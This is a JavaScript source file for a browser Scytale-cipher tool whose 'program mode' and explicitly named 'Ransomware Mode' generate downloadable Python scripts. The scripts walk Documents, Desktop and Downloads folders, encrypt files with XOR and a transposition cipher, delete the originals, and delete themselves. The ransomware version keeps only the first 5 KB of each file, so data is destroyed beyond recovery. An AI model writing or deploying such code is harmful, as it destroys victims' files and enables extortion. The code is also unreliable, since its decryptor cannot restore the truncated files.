// Utility functions
const arrayBufferToBase64 = (buffer) => {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    for (let i = 0; i < bytes.length; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
};

const base64ToArrayBuffer = (base64) => {
    const binary = atob(base64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    return bytes.buffer;
};

// Scytale cipher implementation

class ScytaleCipher {

    static encrypt(text, columns) {
        const paddingNeeded = columns - (text.length % columns);
        const paddedText = text + ' '.repeat(paddingNeeded);
        const rows = paddedText.length / columns;
        const matrix = Array(rows).fill().map(() => Array(columns).fill(''));
        
        let currentChar = 0;
        for (let i = 0; i < rows; i++) {
            for (let j = 0; j < columns; j++) {
                if (currentChar < paddedText.length) {
                    matrix[i][j] = paddedText[currentChar];
                    currentChar++;
                }
            }
        }
        
        let result = '';
        for (let j = 0; j < columns; j++) {
            for (let i = 0; i < rows; i++) {
                result += matrix[i][j];
            }
        }
        
        return {
            result: result.trimEnd(),
            matrix
        };
    }

    static decrypt(text, columns) {
        const rows = Math.ceil(text.length / columns);
        const matrix = Array(rows).fill().map(() => Array(columns).fill(''));
        
        let currentChar = 0;
        for (let j = 0; j < columns; j++) {
            for (let i = 0; i < rows; i++) {
                if (currentChar < text.length) {
                    matrix[i][j] = text[currentChar];
                    currentChar++;
                }
            }
        }
        
        let result = '';
        for (let i = 0; i < rows; i++) {
            for (let j = 0; j < columns; j++) {
                if (matrix[i][j]) {
                    result += matrix[i][j];
                }
            }
        }
        
        return {
            result: result.trimEnd(),
            matrix
        };
    }
}

// DOM Elements
const elements = {
    tabs: document.querySelectorAll('.tab-btn'),
    tabContents: document.querySelectorAll('.tab-content'),
    textMode: {
        columns: document.getElementById('columns'),
        input: document.getElementById('input-text'),
        output: document.getElementById('output-text'),
        encryptBtn: document.getElementById('encrypt-btn'),
        decryptBtn: document.getElementById('decrypt-btn'),
        table: document.getElementById('scytale-table')
    },
    fileMode: {
        columns: document.getElementById('file-columns'),
        dropZone: document.querySelector('.drop-zone'),
        fileInput: document.getElementById('file-input'),
        encryptBtn: document.getElementById('encrypt-file-btn'),
        decryptBtn: document.getElementById('decrypt-file-btn'),
        downloadBtn: document.getElementById('download-btn'),
        fileStatus: document.getElementById('file-status'),
        fileDetails: document.getElementById('file-details')
    },
    programMode: {
        columns: document.getElementById('program-columns'),
        downloadEncrypt: document.getElementById('download-encryption-program-btn'), // Fixed from downloaEencrypt
        downloadDecrypt: document.getElementById('download-decryption-program-btn')  // Fixed from downloaDencrypt
    }
};

// Add this after your elements declaration
function checkElements() {
    const missing = [];
    
    if (!elements.programMode.columns) missing.push('program-columns');
    if (!elements.programMode.downloadEncrypt) missing.push('download-encryption-program-btn');
    if (!elements.programMode.downloadDecrypt) missing.push('download-decryption-program-btn');
    
    if (missing.length > 0) {
        console.error('Missing elements:', missing);
        return false;
    }
    return true;
}

// Tab functionality
elements.tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        elements.tabs.forEach(t => t.classList.remove('active'));
        elements.tabContents.forEach(c => c.classList.remove('active'));
        
        tab.classList.add('active');
        document.getElementById(`${tab.dataset.tab}-mode`).classList.add('active');
    });
});

// Text mode functionality
elements.textMode.encryptBtn.addEventListener('click', () => {
    const text = elements.textMode.input.value;
    const columns = parseInt(elements.textMode.columns.value);
    
    if (!text || columns < 2) return;
    
    const { result, matrix } = ScytaleCipher.encrypt(text, columns);
    elements.textMode.output.value = result;
    visualizeMatrix(matrix);
});

elements.textMode.decryptBtn.addEventListener('click', () => {
    const text = elements.textMode.input.value;
    const columns = parseInt(elements.textMode.columns.value);
    
    if (!text || columns < 2) return;
    
    const { result, matrix } = ScytaleCipher.decrypt(text, columns);
    elements.textMode.output.value = result;
    visualizeMatrix(matrix);
});

// Visualization function
function visualizeMatrix(matrix) {
    const table = elements.textMode.table;
    table.style.gridTemplateColumns = `repeat(${matrix[0].length}, 1fr)`;
    table.innerHTML = '';
    
    for (let i = 0; i < matrix.length; i++) {
        for (let j = 0; j < matrix[i].length; j++) {
            const cell = document.createElement('div');
            cell.classList.add('scytale-cell');
            cell.textContent = matrix[i][j] || ' ';
            table.appendChild(cell);
        }
    }
}

// File mode functionality
let currentFile = null;

elements.fileMode.dropZone.addEventListener('dragover', (e) => {
    e.preventDefault();
    elements.fileMode.dropZone.classList.add('drag-over');
});

elements.fileMode.dropZone.addEventListener('dragleave', () => {
    elements.fileMode.dropZone.classList.remove('drag-over');
});

elements.fileMode.dropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    elements.fileMode.dropZone.classList.remove('drag-over');
    
    const file = e.dataTransfer.files[0];
    handleFileSelection(file);
});

elements.fileMode.fileInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    handleFileSelection(file);
});

function handleFileSelection(file) {
    if (!file) return;
    
    currentFile = file;
    elements.fileMode.fileStatus.textContent = `Selected file: ${file.name}`;
    elements.fileMode.fileDetails.textContent = `Size: ${(file.size / 1024).toFixed(2)} KB`;
    elements.fileMode.downloadBtn.disabled = true;
}

elements.fileMode.encryptBtn.addEventListener('click', async () => {
    if (!currentFile) return;
    
    const columns = parseInt(elements.fileMode.columns.value);
    if (columns < 2) return;
    
    const buffer = await currentFile.arrayBuffer();
    const base64 = arrayBufferToBase64(buffer);
    const { result } = ScytaleCipher.encrypt(base64, columns);
    
    prepareDownload(result, true);
});

elements.fileMode.decryptBtn.addEventListener('click', async () => {
    if (!currentFile) return;
    
    const columns = parseInt(elements.fileMode.columns.value);
    if (columns < 2) return;
    
    const text = await currentFile.text();
    const { result } = ScytaleCipher.decrypt(text, columns);
    
    try {
        const buffer = base64ToArrayBuffer(result);
        prepareDownload(buffer, false);
    } catch (error) {
        elements.fileMode.fileStatus.textContent = 'Error: Invalid encrypted file';
    }
});

function prepareDownload(content, isEncrypted) {
    let filename = currentFile.name;

    // Append '.encrypted' only during encryption if not already added
    if (isEncrypted && !filename.endsWith('.encrypted')) {
        filename += '.encrypted';
    } else if (!isEncrypted && filename.endsWith('.encrypted')) {
        // Remove '.encrypted' during decryption
        filename = filename.replace('.encrypted', '');
    }

    const blob = isEncrypted
        ? new Blob([content], { type: 'text/plain' })
        : new Blob([content], { type: currentFile.type });

    const url = URL.createObjectURL(blob);

    // Enable the download button and set filename
    elements.fileMode.downloadBtn.disabled = false;
    elements.fileMode.downloadBtn.addEventListener('click', () => {
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    });

    elements.fileMode.fileStatus.textContent = `${isEncrypted ? 'Encrypted' : 'Decrypted'} successfully!`;
    elements.fileMode.fileDetails.textContent = `Ready for download: ${filename}`;
}
// Decryption Button Click Event
elements.fileMode.decryptBtn.addEventListener('click', async () => {
    if (!currentFile) return;

    const columns = parseInt(elements.fileMode.columns.value);
    if (columns < 2) return;

    const text = await currentFile.text();
    const { result } = ScytaleCipher.decrypt(text, columns);

    try {
        const buffer = base64ToArrayBuffer(result);
        prepareDownload(buffer, false);
    } catch (error) {
        elements.fileMode.fileStatus.textContent = 'Error: Invalid encrypted file';
    }
});
// Input validation
function validateNumberInput(input) {
    const value = parseInt(input.value);
    if (value < 2) {
        input.value = 2;
    }
}

elements.textMode.columns.addEventListener('change', () => {
    validateNumberInput(elements.textMode.columns);
});

elements.fileMode.columns.addEventListener('change', () => {
    validateNumberInput(elements.fileMode.columns);
});

// Enhancement: Add copy to clipboard functionality
function addCopyToClipboard(textarea) {
    textarea.addEventListener('click', async () => {
        if (!textarea.value) return;
        
        try {
            await navigator.clipboard.writeText(textarea.value);
            const originalBg = textarea.style.backgroundColor;
            textarea.style.backgroundColor = '#e8f5e9';
            setTimeout(() => {
                textarea.style.backgroundColor = originalBg;
            }, 200);
        } catch (err) {
            console.error('Failed to copy:', err);
        }
    });
}

addCopyToClipboard(elements.textMode.output);

// Enhancement: Add file drag-and-drop visual feedback
elements.fileMode.dropZone.addEventListener('click', () => {
    elements.fileMode.fileInput.click();
});

// Enhancement: Add error handling and user feedback
function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    errorDiv.style.cssText = `
        background-color: #ffebee;
        color: #c62828;
        padding: 1rem;
        border-radius: var(--border-radius);
        margin: 1rem 0;
        animation: fadeIn 0.3s ease;
    `;
    
    document.querySelector('.container').appendChild(errorDiv);
    setTimeout(() => {
        errorDiv.style.animation = 'fadeOut 0.3s ease';
        setTimeout(() => errorDiv.remove(), 300);
    }, 3000);
}

// Enhancement: Add progress indicators for file operations
function showProgress(show) {
    const buttons = [
        elements.fileMode.encryptBtn,
        elements.fileMode.decryptBtn,
        elements.fileMode.downloadBtn
    ];
    
    buttons.forEach(btn => {
        if (show) {
            btn.disabled = true;
            btn.dataset.originalText = btn.textContent;
            btn.textContent = 'Processing...';
        } else {
            btn.disabled = false;
            btn.textContent = btn.dataset.originalText;
        }
    });
}

// Enhancement: Add file size validation
const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB

function validateFileSize(file) {
    if (file.size > MAX_FILE_SIZE) {
        showError('File size exceeds 50MB limit');
        return false;
    }
    return true;
}

// Enhancement: Add auto-resize for text areas
function autoResizeTextArea(textarea) {
    textarea.style.height = 'auto';
    textarea.style.height = textarea.scrollHeight + 'px';
}

elements.textMode.input.addEventListener('input', () => {
    autoResizeTextArea(elements.textMode.input);
});

// Enhancement: Add keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey || e.metaKey) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (document.querySelector('[data-tab="text"]').classList.contains('active')) {
                elements.textMode.encryptBtn.click();
            } else {
                elements.fileMode.encryptBtn.click();
            }
        }
    }
});

// Enhancement: Add animation for visualization
function animateVisualization(matrix) {
    const cells = document.querySelectorAll('.scytale-cell');
    cells.forEach((cell, index) => {
        cell.style.opacity = '0';
        setTimeout(() => {
            cell.style.opacity = '1';
            cell.style.transform = 'scale(1)';
        }, index * 50);
    });
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    // Set default values
    elements.textMode.columns.value = 4;
    elements.fileMode.columns.value = 4;
    
    // Add loading state
    document.body.style.opacity = '0';
    setTimeout(() => {
        document.body.style.opacity = '1';
        document.body.style.transition = 'opacity 0.3s ease';
    }, 100);
});
// Add validation for program mode columns
elements.programMode.columns.addEventListener('change', () => {
    validateNumberInput(elements.programMode.columns);
});


console.log('Program Mode Elements:', {
    columns: elements.programMode.columns,
    downloadEncrypt: elements.programMode.downloadEncrypt,
    downloadDecrypt: elements.programMode.downloadDecrypt
});

// Program Mode functionality
if (checkElements()) {
    // Program Mode Columns validation
    elements.programMode.columns.addEventListener('change', () => {
        validateNumberInput(elements.programMode.columns);
    });

    // Encryption download
    elements.programMode.downloadEncrypt.addEventListener('click', () => {
        try {
            console.log('Encryption download clicked');
            const columns = parseInt(elements.programMode.columns.value);
            if (columns < 2) {
                showError('Number of columns must be 2 or greater');
                return;
            }

            const encryptionScript1 = `import os
import base64
import sys

def scytale_encrypt(text, columns):
    # Pad the text to fill the table
    padding = (columns - (len(text) % columns)) % columns
    padded_text = text + ' ' * padding
    
    # Create the table
    table = [padded_text[i:i+columns] for i in range(0, len(padded_text), columns)]
    
    # Read the table column by column
    encrypted = ''.join(''.join(row[i] for row in table) for i in range(columns))
    
    return encrypted

def encrypt_files(columns):
    script_name = os.path.basename(sys.argv[0])  # Get the name of this script
    
    for filename in os.listdir('.'):
        if os.path.isfile(filename) and not filename.endswith('.encrypted') and filename != script_name:
            try:
                with open(filename, 'rb') as file:
                    content = file.read()
                    is_binary = False
                    try:
                        content = content.decode('utf-8')
                    except UnicodeDecodeError:
                        is_binary = True
                
                if is_binary:
                    content = base64.b64encode(content).decode('utf-8')
                    encrypted_content = scytale_encrypt(content, columns)
                    with open(filename + '.encrypted', 'w', encoding='utf-8') as file:
                        file.write('BINARY:' + encrypted_content)
                else:
                    encrypted_content = scytale_encrypt(content, columns)
                    with open(filename + '.encrypted', 'w', encoding='utf-8') as file:
                        file.write('TEXT:' + encrypted_content)
                
                # Delete the original file
                os.remove(filename)
                print(f"Encrypted and deleted: {filename}")
            except Exception as e:
                print(f"Error processing {filename}: {str(e)}")

if __name__ == '__main__':
    try:
        columns = ${columns}
        print(f"Starting encryption with {columns} columns...")
        encrypt_files(columns)
        print("Encryption complete!")
        
        # Self-delete
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("Self-deleted successfully.")
        sys.exit(0)  # Ensure clean exit
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)
`;

            downloadScript(encryptionScript1, 'encryption_program.py');
        } catch (error) {
            console.error('Encryption error:', error);
            showError('Failed to generate encryption program');
        }
    });

    // Decryption download
    elements.programMode.downloadDecrypt.addEventListener('click', () => {
        try {
            console.log('Decryption download clicked');
            const columns = parseInt(elements.programMode.columns.value);
            if (columns < 2) {
                showError('Number of columns must be 2 or greater');
                return;
            }

            const decryptionScript1 = `import os
import base64
import sys

def scytale_decrypt(text, columns):
    rows = -(-len(text) // columns)  # Ceiling division
    table = [''] * rows
    
    for i, char in enumerate(text):
        row = i % rows
        table[row] += char
    
    decrypted = ''.join(table).rstrip()  # Remove trailing spaces
    return decrypted

def decrypt_files(columns):
    script_name = os.path.basename(sys.argv[0])  # Get the name of this script
    
    for filename in os.listdir('.'):
        if os.path.isfile(filename) and filename.endswith('.encrypted') and filename != script_name:
            try:
                with open(filename, 'r', encoding='utf-8') as file:
                    content = file.read()
                
                if content.startswith('BINARY:'):
                    encrypted_data = content[7:]
                    decrypted_content = scytale_decrypt(encrypted_data, columns)
                    try:
                        binary_data = base64.b64decode(decrypted_content)
                        original_filename = filename[:-len('.encrypted')]
                        with open(original_filename, 'wb') as file:
                            file.write(binary_data)
                    except Exception as e:
                        print(f"Error decoding binary data for {filename}: {str(e)}")
                        continue
                
                elif content.startswith('TEXT:'):
                    encrypted_data = content[5:]
                    decrypted_content = scytale_decrypt(encrypted_data, columns)
                    original_filename = filename[:-len('.encrypted')]
                    with open(original_filename, 'w', encoding='utf-8') as file:
                        file.write(decrypted_content)
                
                # Delete the encrypted file
                os.remove(filename)
                print(f"Decrypted and deleted: {filename}")
            except Exception as e:
                print(f"Error processing {filename}: {str(e)}")

if __name__ == '__main__':
    try:
        columns = ${columns}
        print(f"Starting decryption with {columns} columns...")
        decrypt_files(columns)
        print("Decryption complete!")
        
        # Self-delete
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("Self-deleted successfully.")
        sys.exit(0)  # Ensure clean exit
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)`;

            downloadScript(decryptionScript1, 'decryption_program.py');
        } catch (error) {
            console.error('Decryption error:', error);
            showError('Failed to generate decryption program');
        }
    });
}
// Function to trigger download of the generated script
function downloadScript(content, filename) {
    try {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (error) {
        console.error('Download error:', error);
        showError('Failed to download the program');
    }
}


// Ransomware Mode Implementation

// Elements for Mode 4
const mode4Elements = {
    columns: document.getElementById('columns-mode4'),
    xorKey: document.getElementById('xor-key-mode4'),
    downloadEncrypt: document.getElementById('download-encrypt-mode4'),
    downloadDecrypt: document.getElementById('download-decrypt-mode4')
};

// Paths to target for encryption (important paths)
const importantPaths = ['/Documents', '/Desktop', '/Downloads']; // Adjust paths as needed

// Encryption download functionality for Mode 4
mode4Elements.downloadEncrypt.addEventListener('click', () => {
    try {
        const columns = parseInt(mode4Elements.columns.value);
        const xorKey = mode4Elements.xorKey.value;

        if (columns < 2) {
            showError('Number of columns must be 2 or greater');
            return;
        }
        if (!xorKey) {
            showError('XOR key is required');
            return;
        }

        const encryptionScript = `import os
import base64
import sys

def scytale_encrypt(text, columns):
    rows = (len(text) + columns - 1) // columns
    table = ['' for _ in range(columns)]
    
    for i, char in enumerate(text):
        col = i % columns
        table[col] += char
    
    return ''.join(table)

def xor_encrypt(content, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(content))

def encrypt_files(columns, xor_key):
    script_name = os.path.basename(sys.argv[0])
    important_paths = ${JSON.stringify(importantPaths)}

    for path in important_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for filename in files:
                    if filename != script_name and not filename.endswith('.encrypted'):
                        try:
                            filepath = os.path.join(root, filename)
                            with open(filepath, 'rb') as file:
                                content = file.read(5120)  # Only read first 5 KB

                            try:
                                text_content = content.decode('utf-8')
                                encrypted_text = scytale_encrypt(xor_encrypt(text_content, xor_key), columns)
                                encrypted_content = 'TEXT:' + encrypted_text
                            except UnicodeDecodeError:
                                encrypted_binary = scytale_encrypt(base64.b64encode(xor_encrypt(content.decode('latin-1'), xor_key).encode('latin-1')).decode(), columns)
                                encrypted_content = 'BINARY:' + encrypted_binary

                            encrypted_filename = filepath + '.encrypted'
                            with open(encrypted_filename, 'w') as file:
                                file.write(encrypted_content)
                            
                            # Delete the original file
                            os.remove(filepath)
                            print(f"Encrypted and deleted: {filepath}")
                        except Exception as e:
                            print(f"Error processing {filepath}: {str(e)}")

if __name__ == '__main__':
    columns = ${columns}
    xor_key = '${xorKey}'
    print(f"Starting encryption with {columns} columns and XOR key '{xor_key}'...")
    encrypt_files(columns, xor_key)
    print("Encryption complete!")
    
    # Self-delete
    script_path = os.path.abspath(sys.argv[0])
    os.remove(script_path)
`;

        downloadScript(encryptionScript, 'encrypt_mode4.py');
    } catch (error) {
        console.error('Error generating encryption script for mode 4:', error);
    }
});

// Decryption download functionality for Mode 4
mode4Elements.downloadDecrypt.addEventListener('click', () => {
    try {
        const columns = parseInt(mode4Elements.columns.value);
        const xorKey = mode4Elements.xorKey.value;

        if (columns < 2) {
            showError('Number of columns must be 2 or greater');
            return;
        }
        if (!xorKey) {
            showError('XOR key is required');
            return;
        }

        const decryptionScript = `import os
import base64
import sys

def scytale_decrypt(text, columns):
    rows = (len(text) + columns - 1) // columns
    table = ['' for _ in range(rows)]
    
    index = 0
    for col in range(columns):
        for row in range(rows):
            if index < len(text):
                table[row] += text[index]
                index += 1
    
    return ''.join(table).rstrip()

def xor_decrypt(content, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(content))

def decrypt_files(columns, xor_key):
    script_name = os.path.basename(sys.argv[0])
    important_paths = ${JSON.stringify(importantPaths)}

    for path in important_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for filename in files:
                    if filename.endswith('.encrypted') and filename != script_name:
                        try:
                            filepath = os.path.join(root, filename)
                            with open(filepath, 'r', encoding='utf-8') as file:
                                content = file.read()

                            if content.startswith('BINARY:'):
                                content = content.replace('BINARY:', '')
                                decoded_content = base64.b64decode(xor_decrypt(scytale_decrypt(content, columns), xor_key))
                                original_filename = filepath.replace('.encrypted', '')
                                with open(original_filename, 'wb') as file:
                                    file.write(decoded_content)
                            elif content.startswith('TEXT:'):
                                content = content.replace('TEXT:', '')
                                decoded_content = xor_decrypt(scytale_decrypt(content, columns), xor_key)
                                original_filename = filepath.replace('.encrypted', '')
                                with open(original_filename, 'w', encoding='utf-8') as file:
                                    file.write(decoded_content)
                            
                            # Delete the encrypted file
                            os.remove(filepath)
                            print(f"Decrypted and deleted: {filepath}")
                        except Exception as e:
                            print(f"Error processing {filepath}: {str(e)}")

if __name__ == '__main__':
    columns = ${columns}
    xor_key = '${xorKey}'
    print(f"Starting decryption with {columns} columns and XOR key '{xor_key}'...")
    decrypt_files(columns, xor_key)
    print("Decryption complete!")
    
    # Self-delete
    script_path = os.path.abspath(sys.argv[0])
    os.remove(script_path)
`;

        downloadScript(decryptionScript, 'decrypt_mode4.py');
    } catch (error) {
        console.error('Error generating decryption script for mode 4:', error);
    }
});
